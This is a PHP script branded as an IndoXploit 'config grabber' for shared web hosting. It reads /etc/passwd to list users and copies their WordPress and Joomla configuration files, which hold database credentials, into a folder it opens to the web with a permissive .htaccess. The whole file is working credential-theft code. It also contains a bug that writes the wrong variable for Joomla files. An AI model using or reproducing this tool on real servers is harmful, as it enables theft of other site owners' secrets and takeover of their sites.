<?php
// Tu5b0l3d
// thx to: IndoXPloit, HNc
// Config Wordpress and Joomla Grabber
error_reporting(0);
 echo "<h1><center>Created By IndoXploit<br><a href='configs/'style='text-decoration:none;'>Open Configs</a></center><br></h1>";
//$us = file_get_contents("/etc/passwd");
$usa = fopen('/etc/passwd','r');
$dir = mkdir('configs', 0777);
$rrrr = "Options all \n DirectoryIndex configs.html \n Require None \n Satisfy Any";
$frr = fopen('configs/.htaccess', 'w');

fwrite($frr, $rrrr);
while($us = fgets($usa)){
if($us==""){
    echo "cann't read /etc/passwd";
}
else{
preg_match_all('/(.*?):x:/', $us, $user_byk);

    foreach($user_byk[1] as $user){
        $dir1 = "/home/$user/public_html/";
        if(is_readable($dir1)){
            $dir = "/home/$user/public_html/wp-config.php";
            $dir2 = "/home/$user/public_html/configuration.php";
            $ambil = file_get_contents($dir);
            
        
            if($ambil==""){
                $ambil_joom = file_get_contents($dir2);
                if($ambil_joom==""){                
                  echo "<font color='green'>$user <= Readable (Bukan Wordpress dan Joomla)<br></font>";
                
            }
            else{

                $file1 = "configs/$user-configuration.txt";
                $fp2 = fopen($file1,"w");
                fputs($fp2,$ambil);

                echo "<a href='configs/$user-configuration.txt'style='text-decoration:none;'>$user </a> <= Joomla<br>";
                
            }
                
            }
            else{

                $file1 = "configs/$user-wpconfig.txt";
                $fp2 = fopen($file1,"w");
                fputs($fp2,$ambil);

                echo "<a href='configs/$user-wpconfig.txt'style='text-decoration:none;'>$user </a> <= Wordpress<br>";
                
            }


    }
        else{
            
             
        }

   }

}

}
   ?>
